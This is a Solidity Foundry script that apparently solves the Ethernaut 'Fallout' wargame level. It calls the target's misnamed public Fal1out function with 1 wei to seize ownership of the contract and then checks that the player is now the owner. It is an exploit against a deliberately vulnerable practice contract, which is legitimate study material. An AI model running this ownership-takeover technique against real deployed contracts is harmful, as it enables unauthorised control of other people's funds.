// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EthernautSolution.s.sol";

interface IFallout {
    function Fal1out() external payable;
    function allocate() external payable;
    function sendAllocation(address payable allocator) external;
    function collectAllocations() external;
    function allocatorBalance(address allocator) external view returns (uint256);
    function owner() external view returns (address payable);
}

contract FalloutScript is EthernautSolution {
    function run() external {
        address instance = vm.envOr("INSTANCE", address(0x3fb89e628D384c1E689DF835f09CdBCDF581b17e));
        IFallout target = IFallout(instance);
        (uint256 pk, address player, bool isLocal) = getPlayer();

        startSession(pk, player, isLocal);

        target.Fal1out{value: 1 wei}();
        require(target.owner() == player, "Failed: not the owner");

        stopSession(isLocal);
    }
}
